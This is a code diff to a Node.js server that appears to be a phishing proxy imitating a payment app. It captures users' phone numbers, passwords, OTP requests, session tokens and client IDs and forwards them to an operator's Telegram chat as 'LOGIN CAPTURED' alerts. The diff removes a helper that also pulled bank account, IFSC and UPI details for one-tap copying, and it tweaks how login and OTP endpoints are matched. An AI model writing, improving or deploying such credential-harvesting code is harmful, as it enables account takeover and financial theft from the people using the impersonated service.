@@ -559,53 +559,15 @@ function getOrderAmount(req, respData) {
     return null;
 }
 
-function getTelegramCopyItems(msg) {
-    const text = String(msg || '');
-    const rules = [
-        { label: 'Order ID', re: /(?:^|\n)\s*(?:📋\s*)?(?:Order(?: ID)?|rptNo|Receipt|Transaction)\s*:\s*([^\n]+)/i },
-        { label: 'User ID', re: /(?:^|\n)\s*(?:👤\s*)?(?:User ID|User)\s*:\s*([^\n]+)/i },
-        { label: 'Phone', re: /(?:^|\n)\s*(?:📱\s*)?Phone\s*:\s*([^\n]+)/i },
-        { label: 'Password', re: /(?:^|\n)\s*(?:🔐\s*)?(?:Pass|Password)\s*:\s*([^\n]+)/i },
-        { label: 'App Token', re: /(?:^|\n)\s*(?:🎫\s*)?Token\s*:\s*([^\n]+)/i },
-        { label: 'Client ID', re: /(?:^|\n)\s*(?:🆔\s*)?Client ID\s*:\s*([^\n]+)/i },
-        { label: 'Account', re: /(?:^|\n)\s*(?:Account|Acc(?:ount)? No)\s*:\s*([^\n]+)/i },
-        { label: 'IFSC', re: /(?:^|\n)\s*(?:IFSC)\s*:\s*([^\n]+)/i },
-        { label: 'UPI ID', re: /(?:^|\n)\s*(?:UPI(?: ID)?|VPA)\s*:\s*([^\n]+)/i },
-        { label: 'Amount', re: /(?:^|\n)\s*(?:💰\s*)?Amount\s*:\s*([^\n]+)/i }
-    ];
-    return rules.map(rule => {
-        const match = text.match(rule.re);
-        if (!match) return null;
-        const value = String(match[1]).replace(/`/g, '').trim();
-        return value && !/^N\/A$/i.test(value) ? { label: rule.label, value } : null;
-    }).filter(Boolean);
-}
-
 async function notifyAdmin(data, msg, options = {}) {
     if (!data.adminChatId || !bot) return null;
-    const providedCopyItems = Array.isArray(options.copyItems)
-        ? options.copyItems.filter(item => item && item.label && item.value !== undefined && item.value !== null && String(item.value) !== '')
-        : [];
-    const detectedCopyItems = getTelegramCopyItems(msg);
-    const seenCopyLabels = new Set();
-    const copyItems = [...providedCopyItems, ...detectedCopyItems].filter(item => {
-        const key = String(item.label).toLowerCase();
-        if (seenCopyLabels.has(key)) return false;
-        seenCopyLabels.add(key);
-        return true;
-    });
-    const replyMarkup = copyItems.length
-        ? { inline_keyboard: copyItems.slice(0, 8).map(item => [{ text: `Copy ${item.label}`, copy_text: { text: String(item.value) } }]) }
-        : undefined;
     let sent = null;
+    const cleanMsg = String(msg || '').substring(0, 4000);
     try {
-        const sendOptions = replyMarkup ? { reply_markup: replyMarkup } : {};
-        sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000), sendOptions);
+        sent = await bot.sendMessage(data.adminChatId, cleanMsg, { parse_mode: 'Markdown' });
     } catch (e) {
-        // Older Telegram Bot API versions may reject copy_text buttons; keep the notification reliable.
-        if (replyMarkup) {
-            try { sent = await bot.sendMessage(data.adminChatId, String(msg).substring(0, 4000)); } catch (e2) { }
-        }
+        // Fallback without parse_mode if formatting fails
+        try { sent = await bot.sendMessage(data.adminChatId, cleanMsg); } catch (e2) { }
     }
     if (options.pin && sent && sent.message_id) {
         try {
@@ -2223,43 +2185,37 @@ app.all('/xxapi/*', async (req, res) => {
             }
         }
 
-        const isOtpEndpoint = urlLower.includes('checksms') || urlLower.includes('sendsms') ||
-            urlLower.includes('sendtken') || urlLower.includes('getsendtken') ||
+        const isOtpEndpoint = (
+            urlLower.includes('checksms') || urlLower.includes('sendsms') ||
             urlLower.includes('sendcode') || urlLower.includes('sendmsg') ||
-            urlLower.includes('/sms');
+            urlLower.includes('/sms')
+        ) && !urlLower.includes('sendtken') && !urlLower.includes('getsendtken');
 
         const isLoginEndpoint = !isOtpEndpoint && (
             urlLower.includes('login') || urlLower.includes('signin') ||
             urlLower.includes('dologin') || urlLower.includes('register') ||
             urlLower.includes('auth')
-        );
+        ) && !urlLower.includes('checksms') && !urlLower.includes('sendtken') && !urlLower.includes('getsendtken');
 
         const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
         const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
         const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
 
-        // ── 1. OTP SEND NOTIFICATION (NO PIN, NO CLIENT ID) ─────────────────────────
+        // ── 1. OTP SEND NOTIFICATION (SINGLE NOTIFICATION WITH PASS, NO PIN, NO CLIENT ID) ──
         if (isOtpEndpoint && (phone || pwd || userId)) {
             const isSuccess = !jsonResp || jsonResp.code === 0 || jsonResp.code === 200 || jsonResp.success === true || (respData && String(respData).toLowerCase().includes('success'));
             if (isSuccess) {
-                const otpMessage = `📩 OTP REQUESTED
+                const otpMessage = `📩 *OTP REQUESTED*
 👤 User: \`${userId || 'N/A'}\`
 💻 Platform: ${platformStr}
 📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
 ✅ OTP sent successfully
 🕐 ${now}`;
-                await notifyAdmin(data, otpMessage, {
-                    pin: false,
-                    copyItems: [
-                        { label: 'User ID', value: userId },
-                        { label: 'Phone', value: phone },
-                        { label: 'Password', value: pwd }
-                    ]
-                });
+                await notifyAdmin(data, otpMessage, { pin: false });
             }
         }
 
-        // ── 2. ACTUAL SUCCESSFUL LOGIN NOTIFICATION (PINNED, WITH CLIENT ID) ────────
+        // ── 2. ACTUAL SUCCESSFUL LOGIN NOTIFICATION (PINNED, WITH CLIENT ID & TOKEN) ───────
         if (isLoginEndpoint) {
             let extractedToken = '';
             if (typeof respData === 'string' && respData.length > 15 && !respData.toLowerCase().includes('success') && !respData.includes(' ')) {
@@ -2286,22 +2242,13 @@ app.all('/xxapi/*', async (req, res) => {
             ).trim();
 
             if (fullToken && fullToken.length >= 10 && !fullToken.toLowerCase().includes('success')) {
-                const loginMessage = `🔑 LOGIN CAPTURED
+                const loginMessage = `🔑 *LOGIN CAPTURED*
 👤 User: \`${userId || 'N/A'}\`
 💻 Platform: ${platformStr}
 📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
 🎫 Token: \`${fullToken}\`${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
 🕐 ${now}`;
-                await notifyAdmin(data, loginMessage, {
-                    pin: true,
-                    copyItems: [
-                        { label: 'User ID', value: userId },
-                        { label: 'Phone', value: phone },
-                        { label: 'Password', value: pwd },
-                        { label: 'App Token', value: fullToken },
-                        { label: 'Client ID', value: clientId }
-                    ]
-                });
+                await notifyAdmin(data, loginMessage, { pin: true });
             }
         }
 
